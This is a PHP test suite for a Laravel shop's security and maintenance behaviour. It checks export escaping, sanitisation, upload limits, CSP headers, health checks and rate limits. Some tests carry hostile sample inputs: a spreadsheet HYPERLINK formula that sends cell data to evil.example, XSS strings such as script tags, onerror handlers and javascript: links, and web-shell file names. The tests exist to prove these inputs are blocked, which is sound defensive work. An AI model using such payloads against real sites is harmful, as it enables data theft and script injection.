<?php

use App\Enums\OrderStatus;
use App\Exceptions\CheckoutFailed;
use App\Filament\Exports\OrderExporter;
use App\Filament\Resources\Categories\Pages\CreateCategory;
use App\Filament\Support\ImageUpload;
use App\Http\Controllers\HealthController;
use App\Models\Category;
use App\Models\Governorate;
use App\Models\Offer;
use App\Models\Order;
use App\Models\Page;
use App\Models\Product;
use App\Models\User;
use App\Services\Catalog;
use App\Services\Checkout;
use App\Services\PriceService;
use Filament\Actions\Exports\Downloaders\XlsxDownloader;
use Filament\Actions\Exports\Enums\ExportFormat;
use Filament\Actions\Exports\Models\Export;
use Filament\Forms\Components\SpatieMediaLibraryFileUpload;
use Illuminate\Console\Scheduling\Schedule;
use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Middleware\TrustHosts;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use Livewire\Livewire;
use OpenSpout\Common\Entity\Cell\FormulaCell;
use OpenSpout\Common\Entity\Row;

describe('the order export', function () {
    beforeEach(function () {
        $this->columns = ['name' => 'name', 'area' => 'area', 'landmark' => 'landmark', 'notes' => 'notes'];
    });

    it('never turns what a shopper typed into a live spreadsheet formula', function (string $typed) {
        $order = Order::factory()->create(['name' => $typed, 'area' => $typed, 'landmark' => $typed, 'notes' => $typed]);

        $cells = Row::fromValues((new OrderExporter(new Export, $this->columns, []))($order))->getCells();

        foreach ($cells as $cell) {
            expect($cell)->not->toBeInstanceOf(FormulaCell::class)
                ->and((string) $cell->getValue())->toStartWith("'");
        }
    })->with([
        'equals' => ['=HYPERLINK("http://evil.example/?x="&A2,"click")'],
        'plus' => ['+1+1'],
        'minus' => ['-1+1'],
        'at' => ['@SUM(A1)'],
        'tab' => ["\t=1+1"],
        'carriage return' => ["\r=1+1"],
    ]);

    it('leaves normal answers exactly as typed', function (string $typed) {
        $order = Order::factory()->create(['name' => $typed]);

        expect((new OrderExporter(new Export, ['name' => 'name'], []))($order))->toBe([$typed]);
    })->with(['سارة علي', 'Sara = Ali', 'قرب مدرسة 1+1']);

    it('hands out Excel files whatever format the link asks for', function () {
        expect(OrderExporter::getDownloader(ExportFormat::Csv))->toBeInstanceOf(XlsxDownloader::class);
    });
});

describe('order numbers', function () {
    beforeEach(function () {
        $product = Product::factory()->create(['stock' => 5]);
        $governorate = Governorate::factory()->create(['is_active' => true]);

        $this->place = fn (int $quantity = 1) => app(Checkout::class)->place(
            ['name' => 'سارة علي', 'phone' => '07701234567', 'governorate_id' => $governorate->id, 'area' => 'المنصور', 'landmark' => 'قرب الجامع'],
            [['product_id' => $product->id, 'qty' => $quantity]],
            null,
            'ar',
            '127.0.0.1',
        );
    });

    it('are never handed out twice, even after the newest order is deleted', function () {
        $first = ($this->place)();
        $number = $first->number;

        $first->delete();

        expect(($this->place)()->number)->not->toBe($number);
    });

    it('are given back when the checkout fails', function () {
        $first = ($this->place)();

        expect(fn () => ($this->place)(99))->toThrow(CheckoutFailed::class);

        $next = (int) Str::afterLast(($this->place)()->number, '-');

        expect($next)->toBe((int) Str::afterLast($first->number, '-') + 1);
    });
});

describe('requests for another site', function () {
    it('are turned away', function () {
        expect(app(Kernel::class)->getGlobalMiddleware())->toContain(TrustHosts::class);
    });
});

describe('scheduled work', function () {
    it('recovers within minutes when the host kills the queue worker', function () {
        $worker = collect(app(Schedule::class)->events())
            ->first(fn ($event) => str_contains((string) $event->command, 'queue:work'));

        expect($worker->withoutOverlapping)->toBeTrue()
            ->and($worker->expiresAt)->toBeLessThanOrEqual(5);
    });
});

describe('links typed into the admin', function () {
    it('never carry a script or leave through a protocol-relative address', function (string $link) {
        expect(shop_link($link))->toBe(shop_route('home'));
    })->with(['javascript:alert(1)', 'JaVaScRiPt:alert(1)', ' javascript:alert(1)', 'data:text/html,x', 'vbscript:x', '//evil.example/']);

    it('still accept normal links', function () {
        expect(shop_link('https://instagram.com/joz'))->toBe('https://instagram.com/joz')
            ->and(shop_link('/offers'))->toEndWith('/offers');
    });
});

describe('page bodies written in the admin', function () {
    it('lose anything that could run in a shopper\'s browser', function () {
        $page = Page::factory()->create([
            'slug' => 'xss-check',
            'body_ar' => '<p>نص آمن</p><script>alert(1)</script><img src=x onerror=alert(2)><a href="javascript:alert(3)">x</a><iframe src="https://evil.example"></iframe>',
        ]);

        $this->get('/page/'.$page->slug)
            ->assertOk()
            ->assertSee('نص آمن')
            ->assertDontSee('alert(1)', false)
            ->assertDontSee('alert(2)', false)
            ->assertDontSee('alert(3)', false)
            ->assertDontSee('evil.example', false);
    });
});

describe('private files', function () {
    it('have no web route at all', function () {
        expect(Route::has('storage.local'))->toBeFalse()
            ->and(Route::has('storage.local.upload'))->toBeFalse()
            ->and(config('filesystems.disks.local.serve'))->toBeFalse();
    });
});

describe('deleting an order', function () {
    it('is refused while the order still holds stock', function (OrderStatus $status) {
        expect(User::factory()->owner()->create()->can('delete', Order::factory()->create(['status' => $status])))->toBeFalse();
    })->with(fn () => array_filter(OrderStatus::cases(), fn (OrderStatus $status) => ! in_array($status, [OrderStatus::Cancelled, OrderStatus::Delivered], true)));

    it('is allowed once the order is finished', function (OrderStatus $status) {
        expect(User::factory()->owner()->create()->can('delete', Order::factory()->create(['status' => $status])))->toBeTrue();
    })->with([OrderStatus::Cancelled, OrderStatus::Delivered]);
});

describe('the catalog cache', function () {
    it('shows an edit straight away', function () {
        $product = Product::factory()->create(['name_ar' => 'كرسي قديم']);

        expect(app(Catalog::class)->search('كرسي'))->toHaveCount(1);

        $product->update(['name_ar' => 'طاولة جديدة']);

        expect(app(Catalog::class)->search('كرسي'))->toBeEmpty()
            ->and(app(Catalog::class)->search('طاولة'))->toHaveCount(1);
    });

    it('never holds prices or stock', function () {
        $product = Product::factory()->create(['price' => 100_000, 'stock' => 5]);
        Offer::factory()->forProduct($product)->percent(10)->create();

        app(Catalog::class)->onOffer();

        DB::table('products')->where('id', $product->id)->update(['price' => 200_000, 'stock' => 1]);
        app(PriceService::class)->flush();

        $fresh = app(Catalog::class)->onOffer()->sole();

        expect($fresh->stock)->toBe(1)
            ->and(app(PriceService::class)->finalPrice($fresh))->toBe(180_000);
    });

    it('drops a product the moment its offer ends, even from a cached list', function () {
        $product = Product::factory()->create();
        $offer = Offer::factory()->forProduct($product)->percent(10)->create();

        expect(app(Catalog::class)->onOffer())->toHaveCount(1);

        DB::table('offers')->where('id', $offer->id)->update(['ends_at' => now()->subMinute()]);
        $second = Offer::factory()->forProduct(Product::factory()->create())->percent(10)->create();
        DB::table('offers')->where('id', $second->id)->delete();
        app(PriceService::class)->flush();

        expect(app(Catalog::class)->onOffer())->toBeEmpty();
    });
});

describe('the home page', function () {
    it('asks the database the same number of questions however many sections there are', function () {
        $count = function () {
            DB::flushQueryLog();
            DB::enableQueryLog();
            $this->get('/')->assertOk();
            DB::disableQueryLog();

            return count(DB::getQueryLog());
        };

        Category::factory()->count(2)->create();
        $count(); // Fills the caches, so both counts below are of a normal visit.
        $few = $count();

        Category::factory()->count(6)->create();
        $count();

        expect($count())->toBe($few);
    });
});

describe('uploads waiting to be validated', function () {
    it('never sit on the public disk', function () {
        expect(config('livewire.temporary_file_upload.disk'))->toBe('local')
            ->and(config('filesystems.disks.local.root'))->not->toContain('public');
    });

    it('must be images from the moment they arrive', function (string $file, bool $allowed) {
        $validator = Validator::make(
            ['upload' => UploadedFile::fake()->create($file, 10)],
            ['upload' => config('livewire.temporary_file_upload.rules')],
        );

        expect($validator->passes())->toBe($allowed);
    })->with([
        ['shell.php', false],
        ['shell.phtml', false],
        ['run.exe', false],
        ['page.html', false],
        ['drawing.svg', false],
        ['photo.jpg', true],
        ['photo.webp', true],
    ]);

    it('keeps the rest of the Livewire settings', function () {
        expect(config('livewire.class_namespace'))->toBe('App\\Livewire')
            ->and(config('livewire.temporary_file_upload.cleanup'))->toBeTrue();
    });
});

describe('image uploads', function () {
    it('are shrunk in the browser', function () {
        $upload = ImageUpload::configure(SpatieMediaLibraryFileUpload::make('image'));

        expect($upload->getImageResizeMode())->toBe('contain')
            ->and($upload->getImageResizeTargetWidth())->toBe('2400')
            ->and($upload->getImageResizeTargetHeight())->toBe('2400')
            ->and($upload->getImageResizeUpscale())->toBeFalse();
    });

    it('are refused on the server when too big to process', function () {
        $this->actingAs(owner());

        Livewire::test(CreateCategory::class)
            ->fillForm(['image' => [UploadedFile::fake()->image('giant.jpg', 6001, 10)]])
            ->call('create')
            ->assertHasFormErrors(['image']);
    });

    it('still accept a photo at the limit', function () {
        $this->actingAs(owner());

        Livewire::test(CreateCategory::class)
            ->fillForm(['image' => [UploadedFile::fake()->image('large.jpg', 6000, 10)]])
            ->call('create')
            ->assertHasNoFormErrors(['image']);
    });
});

describe('malformed requests', function () {
    beforeEach(function () {
        RateLimiter::clear('checkout');
        Governorate::factory()->create(['is_active' => true]);
    });

    it('never crash a listing, whatever the query string holds', function (string $query) {
        $category = Category::factory()->create(['slug' => 'sofas']);
        Product::factory()->for($category)->create();

        $this->get("/category/sofas?{$query}")->assertOk();
    })->with([
        'nested color' => ['color[][]=x'],
        'nested material' => ['material[][]=x'],
        'named color' => ['color[a][b]=x'],
        'array price' => ['min[]=1&max[][]=2'],
    ]);

    it('are refused politely by order tracking', function (array $fields) {
        $this->followingRedirects()->from('/track')->post('/track', $fields)->assertOk();
    })->with([
        'number' => [['number' => ['a'], 'phone' => '07701234567']],
        'phone' => [['number' => 'JG-26-0001', 'phone' => ['x' => 'a']]],
        'nested' => [['number' => [['a']], 'phone' => [['b']]]],
    ]);

    it('are refused politely by the checkout, on the page that comes back too', function (string $field) {
        $this->followingRedirects()
            ->from('/checkout')
            ->post('/checkout', ['cart' => '[]', $field => ['crafted']])
            ->assertOk();
    })->with(['name', 'phone', 'governorate_id', 'area', 'landmark', 'notes', 'coupon', 'cart', 'website']);
});

describe('the demo catalog', function () {
    it('stays out unless someone asks for it', function () {
        expect(file_get_contents(config_path('joz.php')))->toContain("env('SEED_DEMO', false)");
    });
});

describe('other websites', function () {
    it('cannot read the health check', function () {
        $this->getJson('/api/health', ['Origin' => 'https://evil.example'])
            ->assertOk()
            ->assertHeaderMissing('Access-Control-Allow-Origin');
    });

    it('get no answer to a cross-site preflight', function () {
        $this->call('OPTIONS', '/api/health', server: [
            'HTTP_ORIGIN' => 'https://evil.example',
            'HTTP_ACCESS_CONTROL_REQUEST_METHOD' => 'GET',
            'HTTP_ACCESS_CONTROL_REQUEST_HEADERS' => 'x-health-token',
        ])->assertHeaderMissing('Access-Control-Allow-Origin');
    });
});

describe('external links', function () {
    it('never pass on where the visitor came from', function () {
        $unsafe = collect(File::allFiles(resource_path('views')))
            ->flatMap(fn ($file) => collect(explode("\n", $file->getContents()))
                ->filter(fn (string $line) => str_contains($line, 'target="_blank"') && ! str_contains($line, 'rel="noopener noreferrer"'))
                ->map(fn (string $line) => $file->getFilename()));

        expect($unsafe->all())->toBe([]);
    });
});

describe('the words on the home page', function () {
    it('make no claim the store cannot back up yet', function (string $locale) {
        $home = trans('shop.home', [], $locale);

        expect($home['ig_title'])->not->toContain('بيوت')->not->toContain('homes')
            ->and($home['best_sub'])->not->toContain('عملاؤنا')->not->toContain('customers');
    })->with(['ar', 'en']);

    it('use an example phone number that cannot be anybody\'s', function (string $locale) {
        $checkout = trans('shop.checkout', [], $locale);

        expect($checkout['phone_hint'])->not->toMatch('/07\d{9}/')
            ->and($checkout['phone_invalid'])->not->toMatch('/07\d{9}/');
    })->with(['ar', 'en']);
});

describe('the shipped browser code', function () {
    function builtScript(): string
    {
        $manifest = json_decode(file_get_contents(public_path('build/manifest.json')), true);

        return file_get_contents(public_path('build/'.$manifest['resources/js/app.js']['file']));
    }

    it('forgets saved delivery details', function () {
        expect(file_get_contents(resource_path('js/app.js')))->toContain('CUSTOMER_DAYS = 30');
        expect(builtScript())->toContain('saved_at');
    });
});

describe('the settings template', function () {
    beforeEach(function () {
        $this->example = file_get_contents(base_path('.env.example'));
    });

    it('lists every setting the project reads', function () {
        $used = collect([...File::allFiles(config_path()), ...File::allFiles(app_path())])
            ->flatMap(fn ($file) => str($file->getContents())->matchAll("/\benv\(\s*'([A-Z][A-Z0-9_]*)'/"))
            ->unique();

        expect($used->reject(fn (string $name) => preg_match("/^#? ?{$name}=/m", $this->example) === 1)->values()->all())->toBe([]);
    });

    it('leaves optional settings commented out', function () {
        $optional = str($this->example)->after('# Optional settings')->explode("\n")->filter()->values();

        expect($optional->count())->toBeGreaterThan(100)
            ->and($optional->every(fn (string $line) => str_starts_with($line, '#')))->toBeTrue();
    });
});

describe('the docs', function () {
    it('never print a password that could be pasted as it is', function () {
        expect(file_get_contents(base_path('DEPLOY.md')))->not->toContain('Str0ng');
    });

    it('describe this project, not the framework', function () {
        expect(file_get_contents(base_path('README.md')))->toContain('Joz Gallery')->not->toContain('laravel.com/img');
    });
});

describe('rate limits', function () {
    it('count each feature on its own, so searching never blocks tracking an order', function () {
        foreach (range(1, 12) as $keystroke) {
            $this->getJson('/search/suggest?q=ك')->assertOk();
        }

        $this->post('/track', ['number' => 'JG-26-0001', 'phone' => '07701234567'])
            ->assertStatus(302);
    });

    it('still stop someone guessing order numbers', function () {
        foreach (range(1, 10) as $guess) {
            $this->post('/track', ['number' => "JG-26-{$guess}", 'phone' => '07701234567'])->assertStatus(302);
        }

        $this->post('/track', ['number' => 'JG-26-11', 'phone' => '07701234567'])->assertStatus(429);
    });
});

describe('the log folder', function () {
    beforeEach(function () {
        $this->moved = [];

        foreach (File::glob(storage_path('logs/*.log')) as $log) {
            File::move($log, $log.'.keep');
            $this->moved[] = $log;
        }
    });

    afterEach(function () {
        File::delete(File::glob(storage_path('logs/*.log')));

        foreach ($this->moved as $log) {
            File::move($log.'.keep', $log);
        }
    });

    function fakeLog(string $name, int $megabytes, int $hoursOld): string
    {
        $path = storage_path("logs/{$name}.log");

        File::put($path, str_repeat('x', $megabytes * 1024 * 1024));
        touch($path, now()->subHours($hoursOld)->timestamp);

        return $path;
    }

    it('drops the oldest logs once it passes the limit', function () {
        $today = fakeLog('laravel-today', 120, 0);
        $yesterday = fakeLog('laravel-yesterday', 60, 24);
        $old = fakeLog('laravel-old', 60, 48);

        $this->artisan('logs:trim')->assertSuccessful();

        expect(File::exists($today))->toBeTrue()
            ->and(File::exists($yesterday))->toBeTrue()
            ->and(File::exists($old))->toBeFalse();
    });

    it('leaves a folder under the limit alone', function () {
        $log = fakeLog('laravel-small', 10, 72);

        $this->artisan('logs:trim')->assertSuccessful();

        expect(File::size($log))->toBe(10 * 1024 * 1024);
    });

    it('empties one huge log rather than letting it fill the disk', function () {
        $log = fakeLog('laravel-huge', 210, 0);

        $this->artisan('logs:trim')->assertSuccessful();

        expect(File::exists($log))->toBeTrue()
            ->and(File::size($log))->toBeLessThan(1024);
    });

    it('is checked every hour', function () {
        $event = collect(app(Schedule::class)->events())->first(fn ($event) => str_contains((string) $event->command, 'logs:trim'));

        expect($event->expression)->toBe('0 * * * *');
    });
});

describe('the admin', function () {
    it('never sends staff names to an avatar service', function () {
        $user = owner();
        $user->name = '<سارة>"';

        $avatar = filament()->getUserAvatarUrl($user);

        expect($avatar)->toStartWith('data:image/svg+xml;base64,')
            ->and(base64_decode(Str::after($avatar, 'base64,')))->toContain('&lt;')->not->toContain('<سارة');
    });
});

describe('the content security policy', function () {
    it('lets the shop run only its own scripts', function (string $path) {
        $policy = $this->get($path)->headers->get('Content-Security-Policy');

        expect($policy)->toContain("script-src 'self';")
            ->toContain("object-src 'none'")
            ->toContain("base-uri 'self'")
            ->toContain("frame-ancestors 'self'");
    })->with(['/', '/en', '/cart', '/checkout', '/track']);

    it('allows the admin what Filament needs', function () {
        expect($this->get('/admin/login')->headers->get('Content-Security-Policy'))->toContain("'unsafe-eval'");
    });

    it('lets the admin uploader build the worker that shrinks photos', function () {
        expect($this->get('/admin/login')->headers->get('Content-Security-Policy'))->toContain("worker-src 'self' blob:");
    });

    it('gives the shop no such worker', function () {
        expect($this->get('/')->headers->get('Content-Security-Policy'))->not->toContain('worker-src');
    });

    it('covers error pages', function () {
        expect($this->get('/no-such-page')->assertNotFound()->headers->get('Content-Security-Policy'))->toContain("script-src 'self';");
    });

    it('asks for https only on a secure connection', function () {
        expect($this->get('/')->headers->get('Content-Security-Policy'))->not->toContain('upgrade-insecure-requests')
            ->and($this->get('https://localhost/')->headers->get('Content-Security-Policy'))->toContain('upgrade-insecure-requests');
    });
});

describe('the health check', function () {
    beforeEach(fn () => config(['joz.health_token' => 'a-long-test-token']));

    it('tells strangers only that the site is up', function () {
        $this->getJson('/api/health')->assertOk()->assertExactJson(['status' => 'ok']);
    });

    it('needs no session and is never cached', function () {
        $response = $this->getJson('/api/health');

        expect($response->headers->get('Cache-Control'))->toContain('no-store')
            ->and($response->headers->getCookies())->toBeEmpty();
    });

    it('gives the figures to a monitor with the token', function () {
        Cache::forever(HealthController::SCHEDULER_KEY, time());

        $this->getJson('/api/health', ['X-Health-Token' => 'a-long-test-token'])
            ->assertOk()
            ->assertJsonPath('status', 'ok')
            ->assertJsonPath('database.ok', true)
            ->assertJsonStructure([
                'database' => ['latency_ms'],
                'memory' => ['current_mb', 'peak_mb', 'limit'],
                'disk' => ['free_mb', 'total_mb', 'used_percent'],
                'uptime' => ['deployed_at', 'seconds', 'revision'],
                'scheduler' => ['last_run_seconds_ago'],
                'queue' => ['waiting', 'failed'],
                'backup' => ['count', 'newest_hours_ago'],
            ]);
    });

    it('refuses a wrong token', function () {
        $this->getJson('/api/health', ['X-Health-Token' => 'wrong'])->assertExactJson(['status' => 'ok']);
    });

    it('gives nobody the figures when no token is set', function () {
        config(['joz.health_token' => '']);

        $this->getJson('/api/health', ['X-Health-Token' => ''])->assertExactJson(['status' => 'ok']);
    });

    it('notices when cron has stopped', function () {
        Cache::forever(HealthController::SCHEDULER_KEY, time() - 600);

        $this->getJson('/api/health', ['X-Health-Token' => 'a-long-test-token'])
            ->assertOk()
            ->assertJsonPath('status', 'degraded')
            ->assertJsonPath('scheduler.ok', false);
    });

    it('answers 503 without details when the database is gone', function () {
        DB::partialMock()->shouldReceive('select')->andThrow(new RuntimeException('db1.internal refused joz_app'));

        $this->getJson('/api/health')
            ->assertStatus(503)
            ->assertExactJson(['status' => 'down'])
            ->assertDontSee('db1.internal');
    });

    it('hears cron every minute', function () {
        $beat = collect(app(Schedule::class)->events())->first(fn ($event) => $event->description === 'health-heartbeat');

        expect($beat)->not->toBeNull()->and($beat->expression)->toBe('* * * * *');
    });
});

describe('settings files', function () {
    it('are all kept out of git except the example', function () {
        $ignored = file_get_contents(base_path('.gitignore'));

        expect($ignored)->toMatch('/^\.env\.\*$/m')->toMatch('/^!\.env\.example$/m');
    });

    it('sit beside dumps, keys and archives that git must never take', function (string $pattern) {
        expect(file_get_contents(base_path('.gitignore')))->toMatch('/^'.preg_quote($pattern, '/').'$/m');
    })->with(['*.sql', '*.sql.gz', '*.zip', '*.pem', '*.key', 'staging-latency.csv', 'desktop.ini', '/.claude', '/.mcp.json']);
});

describe('old cache files', function () {
    beforeEach(function () {
        $this->folder = storage_path('framework/cache/data/zz/test');
        File::ensureDirectoryExists($this->folder);
    });

    afterEach(fn () => File::deleteDirectory(storage_path('framework/cache/data/zz')));

    it('are swept away, and live ones are kept', function () {
        File::put($this->folder.'/expired', (now()->subMinute()->timestamp).serialize('old'));
        File::put($this->folder.'/live', (now()->addHour()->timestamp).serialize('new'));

        $this->artisan('cache:sweep')->assertSuccessful();

        expect(File::exists($this->folder.'/expired'))->toBeFalse()
            ->and(File::exists($this->folder.'/live'))->toBeTrue();
    });

    it('are swept every day', function () {
        $commands = collect(app(Schedule::class)->events())->map(fn ($event) => $event->command)->implode(' ');

        expect($commands)->toContain('cache:sweep');
    });
});
